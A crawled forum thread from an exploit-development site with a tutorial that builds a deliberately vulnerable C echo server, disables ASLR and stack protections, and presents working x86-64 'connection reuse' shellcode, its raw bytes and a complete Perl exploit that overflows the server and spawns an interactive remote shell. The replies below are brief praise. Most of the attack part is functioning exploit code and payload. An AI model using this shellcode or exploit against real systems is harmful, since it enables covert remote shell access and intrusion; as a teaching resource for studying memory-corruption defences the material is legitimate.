<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Remote Exploit. Shellcode without Sockets - Exploit Development - 0x00sec - The Home of the Hacker</title>
<meta name="description" content="In this paper I will present an elegant technique (it’s my opinion, indeed) to get shell access to a vulnerable remote machine. It is not my own technique but I found it very interesting. The focus of this paper is on th&amp;hellip;">
<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
<meta name="theme-color" media="all" content="#171616">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="1440.html" />
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
<link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
<link href="../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
<link href="../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
<link href="../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
<link href="../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
<link href="../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
<link href="../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
<link href="../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
<link href="../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
<link href="../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
<link href="../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
<link href="../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
<link href="../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
<link href="../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
<link href="../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
<link rel="preload" href="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
<script defer src="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Remote Exploit. Shellcode without Sockets&#39;" href="1440.rss" />
<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:url" content="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440" />
<meta name="twitter:url" content="https://0x00sec.org/t/remote-exploit-shellcode-without-sockets/1440" />
<meta property="og:title" content="Remote Exploit. Shellcode without Sockets" />
<meta name="twitter:title" content="Remote Exploit. Shellcode without Sockets" />
<meta property="og:description" content="In this paper I will present an elegant technique (it’s my opinion, indeed) to get shell access to a vulnerable remote machine. It is not my own technique but I found it very interesting. The focus of this paper is on this technique and not in the way to exploit the vulnerability.  Setting your environment So, in order to focus on the remote shell code and not on how to circumvent ASLR, non-executable stacks and so on (that will require lots of writing) we will disable most of these features for..." />
<meta name="twitter:description" content="In this paper I will present an elegant technique (it’s my opinion, indeed) to get shell access to a vulnerable remote machine. It is not my own technique but I found it very interesting. The focus of this paper is on this technique and not in the way to exploit the vulnerability.  Setting your environment So, in order to focus on the remote shell code and not on how to circumvent ASLR, non-executable stacks and so on (that will require lots of writing) we will disable most of these features for..." />
<meta property="og:article:section" content="Exploit Development" />
<meta property="og:article:section:color" content="92278F" />
<meta property="og:article:tag" content="shellcode" />
<meta property="og:article:tag" content="exploit" />
<meta property="og:article:tag" content="remoteshell" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="7 mins 🕑" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="74 ❤" />
<meta property="article:published_time" content="2017-01-06T17:37:41+00:00" />
<meta property="og:ignore_canonical" content="true" />
<link rel="next" href="1440%3Fpage=2.html">
</head>
<body class="crawler ">
<div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">

<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
<header>
<a href="../../index.html">
0x00sec - The Home of the Hacker
</a>
</header>
<div id="main-outlet" class="wrap" role="main">
<div id="topic-title">
<h1>
<a href="1440.html">Remote Exploit. Shellcode without Sockets</a>
</h1>
<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../c/exploit-development.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #92278F"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">Exploit Development</span>
</span>
</a>
<meta itemprop="position" content="1" />
</span>
</div>
<div class="topic-category">
<div class="discourse-tags list-tags">
<a href="../../tag/shellcode.html" class="discourse-tag" rel="tag">shellcode</a>,
<a href="../../tag/exploit.html" class="discourse-tag" rel="tag">exploit</a>,
<a href="../../tag/remoteshell.html" class="discourse-tag" rel="tag">remoteshell</a>
</div>
</div>
</div>
<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
<meta itemprop="headline" content="Remote Exploit. Shellcode without Sockets">
<meta itemprop="articleSection" content="Exploit Development">
<meta itemprop="keywords" content="shellcode, exploit, remoteshell">
<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
<meta itemprop="name" content="0x00sec - The Home of the Hacker">
<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
</div>
</div>
<div id="post_1" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="1440.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-01-06T17:37:41Z" class="post-time">
January 6, 2017, 5:37pm
</time>
<meta itemprop="dateModified" content="2017-01-09T06:13:56Z">
<span itemprop="position">1</span>
</span>
</div>
<div class="post" itemprop="articleBody">
<p>In this paper I will present an elegant technique (it’s my opinion, indeed) to get shell access to a vulnerable remote machine. It is not my own technique but I found it very interesting. The focus of this paper is on this technique and not in the way to exploit the vulnerability.</p>
<h1>Setting your environment</h1>
<p>So, in order to focus on the remote shell code and not on how to circumvent ASLR, non-executable stacks and so on (that will require lots of writing) we will disable most of these features for our test. Once you get your shellcode ready you can, indeed try to bring the protections back and exploit again the program. That is a very interesting exercise if you want to try.</p>
<p>First, we will disable the <a href="https://en.wikipedia.org/wiki/Address_space_layout_randomization" rel="nofollow noopener">ASLR</a>. This can be done with the following command:</p>
<pre><code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
</code></pre>
<p>This is temporary and will be reverted on the next reboot. In case you want it back without rebooting your machine:</p>
<pre><code>echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
</code></pre>
<p>To disable the rest of security functions we will be using the following flags to compile our vulnerable server:</p>
<pre><code>-fno-stack-protector -z execstack
</code></pre>
<p>These flags disables stack canaries and also gives execution permissions to the stack. So we have a very easy to exploit environment.</p>
<h1>A vulnerable service</h1>
<p>Now let’s write a small echo server with a buffer overflow we can exploit remotely. The program is very simple. Can you spot the buffer overflow in the code?. Sure you can.</p>
<pre><code class="lang-auto">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;arpa/inet.h&gt;

int
process_request (int s1, char *reply)
{
  char result[256];

  strcpy (result, reply);
  write (s1, result, strlen(result));
  printf ("Result: %p\n", &amp;result);
  return 0;
}

int
main (int argc, char *argv[])
{
  struct sockaddr_in   server, client;
  socklen_t            len = sizeof (struct sockaddr_in);
  int                  s,s1, ops = 1;
  char                 reply[1024];

  server.sin_addr.s_addr = INADDR_ANY;
  server.sin_family = AF_INET;
  server.sin_port = htons(9000);

  s = socket (PF_INET, SOCK_STREAM, 0);
  if ((setsockopt (s, SOL_SOCKET, SO_REUSEADDR, &amp;ops, sizeof(ops))) &lt; 0)
    perror ("pb_server (reuseaddr):");
  bind (s, (struct sockaddr *) &amp;server, sizeof (server));
  listen (s, 10);

  while (1)
    {
      s1 = accept (s, (struct sockaddr *)&amp;client, &amp;len);
      printf ("Connection from %s\n", inet_ntoa (client.sin_addr));
      memset (reply, 0, 1024);
      read (s1, reply, 1024);
      process_request (s1, reply);
      close (s1);
    }
  return 0;
}

</code></pre>
<p>Pretty standard stuff. Let’s compile it and finish our job making it into the easiest to exploit server ever:</p>
<pre><code>gcc -g -fno-stack-protector -z execstack -o target target.c
</code></pre>
<p>Let’s verify it is vulnerable. Launch it in one terminal and from another terminal run:</p>
<pre><code>$ perl -e 'print "A"x1024;' | nc localhost 9000
</code></pre>
<p>In the terminal running the server we should see something like:</p>
<pre><code>$  ./target
Connection from 127.0.0.1
Result: 0x7fffffffdbf0
Segmentation fault (core dumped)
</code></pre>
<p>Note that I have added a print of the address of a local variable so you can verify that ASLR is disabled. You should always get the same number for every execution of the same binary (number can change if you modify the program).</p>
<p>You can now practice with this program to get a local shell using some of the shellcodes available around. Even if it is very easy you should do it at least once :). I will not cover this here. There are, literally thousands of tutorials on how to exploit a buffer overflow in this conditions. Just google it and do it.</p>
<h1>The Remote Shell</h1>
<p>Now it’s time to get a remote shell. The key word here is remote. This means that there is a network between the vulnerable machine and the attacker. Or in other words, we have to send/receive data through some socket. Based on this, there are fundamentally two ways to get a remote shell:</p>
<ul>
<li>Your shellcode creates a server socket enabling connections from outside and feeding data in and out of a local shell… This is a <strong>Direct</strong> remote shell.</li>
<li>Your shellcode connects back to a predetermined host were some server is waiting for the connection from the victim… This is a <strong>Reverse</strong> remote shell.</li>
</ul>
<p>You may want to read <a href="../remote-shells-part-i/269.html" class="inline-onebox">Remote Shells. Part I</a> for more details.</p>
<p>This two definitions will bring to the mind of many of you those <code>RHOST/RPORT</code> variables, or whatever they are called… Yes, that thing to tell your payload what is the address and port to connect to. For a reverse shell you have to store this information in your payload in order to connect back. For a direct shell you usually define just the port, the server will be waiting for connections.</p>
<p>However, there is a third option, at least for Unix machines.</p>
<h1>Connection Reuse</h1>
<p>When executing a remote exploit, in order to exploit the vulnerability, you are already connected to the server… so, why do not reuse the connection that is already setup?. This is very neat, because it will not show anything suspicious in the victim like open ports for unknown services or outgoing connections from a server <img src="../../images/emoji/twitter/dizzy_face.png%3Fv=9" title=":dizzy_face:" class="emoji" alt=":dizzy_face:"></p>
<p>The way to achieve this is very ingenious. It is based on the fact that, the system assigns file descriptions sequentially. Knowing this, we can just duplicate an existing file descriptor immediately after our connection and… unless the server is under heavy load, we should get a file descriptor equal to the file descriptor of the socket associated to our connection + 1 (so, the fd assigned just before, i.e. our connection).</p>
<p>Once we know the file descriptor for our current on-going connection, we just need to duplicate it to file descriptors 0,1 and 2 (<code>stdin</code>, <code>stdout</code> and <code>stderr</code>) and then spawn a shell. From that point on, all the input/output for that shell will be redirected to the socket.</p>
<p>Still confused? Haven’t read this (<a href="../remote-shells-part-i/269.html" class="inline-onebox">Remote Shells. Part I</a>)?. Maybe now is a good time to do it.</p>
<p>The C code is something like this:</p>
<pre><code class="lang-auto">int sck = dup (0) - 1; // Duplicate stdin
dup2 (sck, 0);
dup2 (sck, 1);
dup2  (sck, 2);
execv ("/bin/sh", NULL);
</code></pre>
<p>See… no socket code at all!. If we make this into a shellcode and we manage to exploit the remote server to run that code, we will get shell access to the remote machine over the connection we used to feed the exploit in the remote server <img src="../../images/emoji/twitter/scream.png%3Fv=9" title=":scream:" class="emoji" alt=":scream:">.</p>
<p>Many of you may have notice that this techniques (as usual) has some drawbacks. We have already mentioned that under heavy load on the server (many connections being established simultaneously), our <code>dup</code> trick may fail, and somebody else will get the shell access <img src="../../images/emoji/twitter/sweat_smile.png%3Fv=9" title=":sweat_smile:" class="emoji" alt=":sweat_smile:">. Also, a proper server will close all file descriptors before becoming a <code>daemon</code> (<code>man daemon</code>), so we may need to try with others values as argument for <code>dup</code>.</p>
<p>This technique was brought to my attention by <a class="mention" href="https://0x00sec.org/u/_py">@_py</a> in a discussion we had some time ago. The original code we checked at that time can be found here:</p>
<p><a href="http://shell-storm.org/shellcode/files/shellcode-881.php" class="onebox" target="_blank" rel="nofollow noopener">http://shell-storm.org/shellcode/files/shellcode-881.php</a></p>
<p>However this is 32bits code so I made my own 64bits version and a Perl script to run the exploit.</p>
<h1>The 64bits Version of the Shellcode</h1>
<p>I’m not really proud of it (I just realised how rusty my ASM is) but it works and it is only 3 bytes longer that the original 32bits version. Here it is:</p>
<pre><code class="lang-auto">section .text
global _start
_start:
	;; s = Dup (0) - 1
	xor rax, rax
	push rax
	push rax
	push rax
	pop rsi
	pop rdx
	push rax
	pop rdi
	mov al, 32
	syscall    		; DUP (rax=32) rdi = 0 (dup (0))

	dec rax
	push rax
	pop rdi 		; mov rdi, rax  ; dec rdi

	;; dup2 (s, 0); dup2(s,1); dup2(s,2)
loop:	mov al, 33
	syscall			; DUP2 (rax=33) rdi=oldfd (socket) rsi=newfd
	inc rsi
	mov rax,rsi
	cmp al, 2		; Loop 0,1,2 (stdin, stdout, stderr)
	
	jne loop


	;; exec (/bin/sh)
	push    rdx			        ; NULL
	mov	qword rdi, 0x68732f6e69622f2f	; "//bin/sh"
	push	rdi				; command
	push 	rsp			
	pop 	rdi			
	
	push 	rdx		;env
	pop 	rsi		;args
	
        mov     al, 0x3b	;EXEC (rax=0x4b) rdi="/bin/sh" rsi=rdx=
        syscall
</code></pre>
<p>I have added some comments for the less obvious parts and you will see a lot of <code>push/pops</code>. The reason is that a <code>PUSH/POP</code> pair is 2 bytes but a <code>MOV R1,R2</code> is 3. This makes the code very ugly but a bit shorter… actually not much so I do not think if it is a good idea. Anyway, be free to improve it and post your versions in the comments. Also do not hesitate to share any doubt about the code.</p>
<h1>Generating our Shellcode</h1>
<p>Now, we have to get the shellcode in a format suitable to be send to the remote server. For doing that we have to first compile the code and then extract the machine code out of the compiled file. Compiling (assembling in this case) is straight forward:</p>
<pre><code>nasm -f elf64 -o rsh.o rsh.asm
</code></pre>
<p>There are many different ways to get the binary data out of the object file. I use these nifty trick that produce a string in a format that I can easily add to a Perl or C program.</p>
<pre><code class="lang-auto">for i in $(objdump -d rsh.o -M intel |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
</code></pre>
<p>The two commands above will produce the following shellcode:</p>
<p><code>\x48\x31\xc0\x50\x50\x50\x5e\x5a\x50\x5f\xb0\x20\x0f\x05\x48\xff\xc8\x50\x5f\xb0\x21\x0f\x05\x48\xff\xc6\x48\x89\xf0\x3c\x02\x75\xf2\x52\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\x52\x5e\xb0\x3b\x0f\x05</code></p>
<p>Time to write the exploit</p>
<h1>The Exploit</h1>
<p>So we have a remote vulnerable system. <strong>You have figure out how to exploit the buffer overflow</strong> in our low-secured environment and we also have a shellcode to run on the remote system. Now we need a exploit. The exploit will put all this together and give us the remote shell we are looking for.</p>
<p>There are many ways to write it. I’ve used used Perl for mine. Of course. <img src="../../images/emoji/twitter/stuck_out_tongue_winking_eye.png%3Fv=9" title=":stuck_out_tongue_winking_eye:" class="emoji" alt=":stuck_out_tongue_winking_eye:"></p>
<p>This is how it looks like:</p>
<pre><code class="lang-auto">#!/usr/bin/perl
use IO::Select;
use IO::Socket::INET;
$|=1;

print "Remote Exploit Example";
print "by 0x00pf for 0x00sec :)\n\n";

# You may need to calculate these magic numbers for your system
$addr = "\x10\xdd\xff\xff\xff\x7f\x00\x00"; 
$off = 264;

# Generate the payload
$shellcode = "\x48\x31\xc0\x50\x50\x50\x5e\x5a\x50\x5f\xb0\x20\x0f\x05\x48\xff\xc8\x50\x5f\xb0\x21\x0f\x05\x48\xff\xc6\x48\x89\xf0\x3c\x02\x75\xf2\x52\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\x52\x5e\xb0\x3b\x0f\x05";

$nops = $off - length $shellcode;
$payload = "\x90" x $nops . $shellcode . $addr;

$plen = length $payload;
$slen = length $shellcode;
print "SLED $nops Shellcode: $slen Payload size: $plen\n";

# Connect
my $socket = new IO::Socket::INET (
    PeerHost =&gt; '127.0.0.1',
    PeerPort =&gt; '9000',
    Proto =&gt; 'tcp',
    );
# Set up select for asynchronous read from the server
$sel = IO::Select-&gt;new( $socket );
$sel-&gt;add(\*STDIN);

# Exploit!
$socket-&gt;send ($payload);
$socket-&gt;recv ($trash,1024);
$timeout = .1;

$flag = 1; # Just to show a prompt

# Interact!
while (1) {
    if (@ready = $sel-&gt;can_read ($timeout))  {
	foreach $fh (@ready) {
	    $flag =1;
	    if($fh == $socket) {
		$socket-&gt;recv ($resp, 1024);
		print $resp;
	    }
	    else { # It is stdin
		$line = &lt;STDIN&gt;;
		$socket-&gt;send ($line);
	    }
	}
    }	
    else { # Show the prompt whenever everything's been read
	print "0x00pf]&gt;  " if ($flag);
	$flag = 0;
    }	
}

</code></pre>
<p>The beginning of the exploit is pretty much the standard stuff. Generate the payload based on the magic numbers <em>you had figured out with the help of <code>gdb</code></em> (note that those number may be different in your system, and the exploit as it is may not just work).</p>
<p>But then, we have to do something else for our special remote shell. With direct and reverse shells, once the exploit has been run and have done its job, we will normally use another program/module to connect to or to receive the connection from the remote machine. It can be <code>netcat</code> or your preferred pentesting platform or your own tool,…</p>
<p>However, in this case we are accessing the shell using an already establish connection. The one we used to send the payload. So I added some code to read commands from <code>stdin</code> and send them to the remote server and also to read data from the remote shell. This is the final part of the exploit. It is standard networking code. Nothing really special in there.</p>
<p>Now, you can try your remote shell exploit!</p>
<h1>Conclusions</h1>
<p>In this paper we have discussed a technique to get pretty stealth shell access to a remote vulnerable server without the need to deal with the <code>sockets</code> API provided by the system. This makes the development of the shellcode simpler and also makes it shorter (check this one for example <a href="http://shell-storm.org/shellcode/files/shellcode-858.php" rel="nofollow noopener">http://shell-storm.org/shellcode/files/shellcode-858.php</a>).</p>
<p>Be free to improve the shellcode and post it in the comments. Also, if somebody wants to try to exploit the server when the system security features are activated, please be my guest. That will involve:</p>
<ul>
<li>Reactivate ASLR (you already know how to do that)</li>
<li>Make stack not executable (remove the <code>-zexecstack</code> flag or use the <code>execstack</code> tool)</li>
<li>Reactivate stack protection (remove the <code>-fno-stackprotector</code> flag)</li>
<li>Go Pro (compile with <code>-DFORTIFY_SOURCE=2</code> or use <code>-O2</code>)</li>
<li>Go master (compile with <code>-O2 -fPIC -pie -fstack-protector-all -Wl,-z,relro,-z,now</code>)</li>
</ul>
<p>Hack Fun!</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="21" />
<span class="post-likes">21 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
<div class="crawler-linkback-list" itemscope itemtype="http://schema.org/ItemList">
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../draft-0x00sec-turns-0x01-one-year/1914/2.html">0x00sec Turns 0x01! One year!</a>
<meta itemprop="position" content="5">
</div>
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../how-can-i-learn-to-form-strings-in-shellcodes/8992/2.html">How can I learn to form strings in shellcodes?</a>
<meta itemprop="position" content="6">
</div>
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../running-binaries-without-leaving-tracks/2166.html">Running binaries without leaving tracks</a>
<meta itemprop="position" content="7">
</div>
<div itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a itemprop="url" href="../0x00sec-turns-0x01-one-year/1914.html">0x00sec Turns 0x01! One year!</a>
<meta itemprop="position" content="8">
</div>
</div>
</div>
<div id="post_2" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
</span>
<link itemprop="mainEntityOfPage" href="1440.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-01-06T17:42:39Z" class="post-time">
January 6, 2017, 5:42pm
</time>
<meta itemprop="dateModified" content="2017-01-06T17:42:39Z">
<span itemprop="position">2</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Kicking 2017 off with a bang. Mamma mia!</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="4" />
<span class="post-likes">4 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_3" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/pry0cc"><span itemprop="name">pry0cc</span></a>
(Leader &amp; Offsec Engineer &amp; Forum Daddy)
</span>
<link itemprop="mainEntityOfPage" href="1440.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-01-06T20:59:32Z" class="post-time">
January 6, 2017, 8:59pm
</time>
<meta itemprop="dateModified" content="2017-01-06T20:59:32Z">
<span itemprop="position">3</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Dude. Bruh.</p>
<aside class="quote no-group" data-username="_py" data-post="2" data-topic="1440" data-full="true">
<div class="title">
<div class="quote-controls"></div>
<img alt width="20" height="20" src="../../user_avatar/0x00sec.org/_py/40/4275_2.png" class="avatar"> _py:</div>
<blockquote>
<p>Kicking 2017 off with a bang. Mamma mia!</p>
</blockquote>
</aside>
<p>:is an understatement.</p>
<p>This is really awesome. The connection reuse thing is such a dope concept.</p>
<p>So. In this example, we deactivated ASLR, and disabled stack canaries. Stack based buffer overflows are all over the web. What can we do today? What do modern day exploits, well, exploit, and how do we bypass ASLR and canaries?</p>
<p>You’ve done a super good job (as always), this is really good work.</p>
<p>- pry0cc</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="5" />
<span class="post-likes">5 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_4" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
(pico)
</span>
<link itemprop="mainEntityOfPage" href="1440.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-01-06T21:11:01Z" class="post-time">
January 6, 2017, 9:11pm
</time>
<meta itemprop="dateModified" content="2017-01-06T21:11:01Z">
<span itemprop="position">4</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Thanks <a class="mention" href="https://0x00sec.org/u/_py">@_py</a> and <a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a>. Glad to heard you liked it.</p>
<p>When facing ASLR and stack protections we have to dive into ROP, Return to Libc and other techniques more advanced. I believe it is difficult to follow that without knowing the basics…</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="4" />
<span class="post-likes">4 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="1" />
</div>
</div>
<div id="post_5" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/pry0cc"><span itemprop="name">pry0cc</span></a>
(Leader &amp; Offsec Engineer &amp; Forum Daddy)
</span>
<link itemprop="mainEntityOfPage" href="1440.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-01-06T21:11:28Z" class="post-time">
January 6, 2017, 9:11pm
</time>
<meta itemprop="dateModified" content="2017-01-06T21:11:28Z">
<span itemprop="position">5</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Teach us master pico!</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_6" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
</span>
<link itemprop="mainEntityOfPage" href="1440.html">
<link itemprop="image" href="https://0x00sec.s3.amazonaws.com/original/2X/4/427a827e1b53c708ab0698ed1fac2195d6c45b98.jpeg">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-01-06T21:18:57Z" class="post-time">
January 6, 2017, 9:18pm
</time>
<meta itemprop="dateModified" content="2017-01-06T21:18:57Z">
<span itemprop="position">6</span>
</span>
</div>
<div class="post" itemprop="text">
<p><a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a>: Enjoy.</p>
<aside class="onebox allowlistedgeneric">
<header class="source">
<img src="https://s1.wp.com/i/favicon.ico" class="site-icon" width="32" height="32">
<a href="https://sploitfun.wordpress.com/2015/05/08/bypassing-aslr-part-i/" target="_blank" rel="noopener nofollow ugc" title="11:19AM - 08 May 2015">sploitF-U-N – 8 May 15</a>
</header>
<article class="onebox-body">
<img src="https://0x00sec.s3.amazonaws.com/original/2X/4/427a827e1b53c708ab0698ed1fac2195d6c45b98.jpeg" class="thumbnail" width height>
<h3><a href="https://sploitfun.wordpress.com/2015/05/08/bypassing-aslr-part-i/" target="_blank" rel="noopener nofollow ugc">Bypassing ASLR – Part I</a></h3>
<p>Prerequisite: Classic Stack Based Buffer Overflow VM Setup: Ubuntu 12.04 (x86) In previous posts, we saw that attacker needs to know stack address (to jump to shellcode) libc base address (to succe…</p>
</article>
